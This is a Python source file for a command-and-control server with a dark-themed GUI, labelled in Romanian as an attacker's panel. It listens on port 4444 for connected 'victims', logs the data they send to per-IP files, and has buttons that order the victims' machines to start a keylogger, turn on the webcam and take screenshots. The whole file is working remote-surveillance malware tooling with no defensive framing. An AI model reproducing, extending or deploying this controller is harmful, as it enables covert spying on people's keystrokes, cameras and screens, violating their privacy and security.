import socket
import threading
import customtkinter as ctk
from datetime import datetime
import os

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

class C2Server:
    def __init__(self):
        self.host = "0.0.0.0"
        self.port = 4444
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.clients = {}          # {client_socket: ip}

        self.save_dir = "received_data"
        os.makedirs(self.save_dir, exist_ok=True)

    def handle_client(self, client_socket, address):
        ip = address[0]
        print(f"[+] Victimă conectată: {ip}")
        self.clients[client_socket] = ip

        try:
            while True:
                data = client_socket.recv(1024).decode('utf-8', errors='ignore').strip()
                if data:
                    self.save_received_data(ip, data)
                    print(f"[{ip}] {data}")
        except:
            print(f"[-] Victimă deconectată: {ip}")
        finally:
            if client_socket in self.clients:
                del self.clients[client_socket]
            client_socket.close()

    def save_received_data(self, ip, data):
        today = datetime.now().strftime("%Y-%m-%d")
        filename = os.path.join(self.save_dir, f"{today}_{ip.replace('.', '_')}.txt")
        
        with open(filename, "a", encoding="utf-8") as f:
            timestamp = datetime.now().strftime("%H:%M:%S")
            f.write(f"[{timestamp}] {data}\n")

    def start_server(self):
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        print(f"[+] C2 Server pornit pe port {self.port}")

        while True:
            client, addr = self.server.accept()
            thread = threading.Thread(target=self.handle_client, args=(client, addr), daemon=True)
            thread.start()

    def send_command(self, command):
        if not self.clients:
            print("[-] Nu există victime conectate!")
            return
        
        for client in list(self.clients.keys()):
            try:
                client.send(command.encode('utf-8'))
            except:
                client.close()
                if client in self.clients:
                    del self.clients[client]

# ====================== GUI ======================
class C2GUI(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("C2 Control Panel - Atacator")
        self.geometry("700x650")
        
        self.c2 = C2Server()
        
        threading.Thread(target=self.c2.start_server, daemon=True).start()

        self.create_widgets()

    def create_widgets(self):
        ctk.CTkLabel(self, text="C2 Control Panel", font=ctk.CTkFont(size=24, weight="bold")).pack(pady=20)

        self.victims_label = ctk.CTkLabel(self, text="Victime conectate: 0", font=ctk.CTkFont(size=16))
        self.victims_label.pack(pady=10)

        btn_frame = ctk.CTkFrame(self)
        btn_frame.pack(pady=20, padx=50, fill="x")

        ctk.CTkButton(btn_frame, text="▶ Start Keylogger", height=50, fg_color="green",
                      command=lambda: self.c2.send_command("START_KEYLOGGER")).pack(pady=8, fill="x")

        ctk.CTkButton(btn_frame, text="■ Stop Keylogger", height=50, fg_color="red",
                      command=lambda: self.c2.send_command("STOP_KEYLOGGER")).pack(pady=8, fill="x")

        ctk.CTkButton(btn_frame, text="📸 Start Webcam", height=50, fg_color="green",
                      command=lambda: self.c2.send_command("START_CAMERA")).pack(pady=8, fill="x")

        ctk.CTkButton(btn_frame, text="📸 Stop Webcam", height=50, fg_color="red",
                      command=lambda: self.c2.send_command("STOP_CAMERA")).pack(pady=8, fill="x")

        ctk.CTkButton(btn_frame, text="📸 Take Screenshot", height=50,
                      command=lambda: self.c2.send_command("TAKE_SCREENSHOT")).pack(pady=8, fill="x")

        ctk.CTkButton(btn_frame, text="▶ Start Auto Screenshot (30s)", height=50, fg_color="green",
                      command=lambda: self.c2.send_command("START_SCREENSHOT")).pack(pady=8, fill="x")

        ctk.CTkButton(btn_frame, text="■ Stop Auto Screenshot", height=50, fg_color="red",
                      command=lambda: self.c2.send_command("STOP_SCREENSHOT")).pack(pady=8, fill="x")

        self.status = ctk.CTkLabel(self, text="Server pornit | Aștept victime...", font=ctk.CTkFont(size=14))
        self.status.pack(pady=30)

        # Update număr victime
        self.update_victims()

    def update_victims(self):
        count = len(self.c2.clients)
        self.victims_label.configure(text=f"Victime conectate: {count}")
        self.after(2000, self.update_victims)

if __name__ == "__main__":
    app = C2GUI()
    app.mainloop()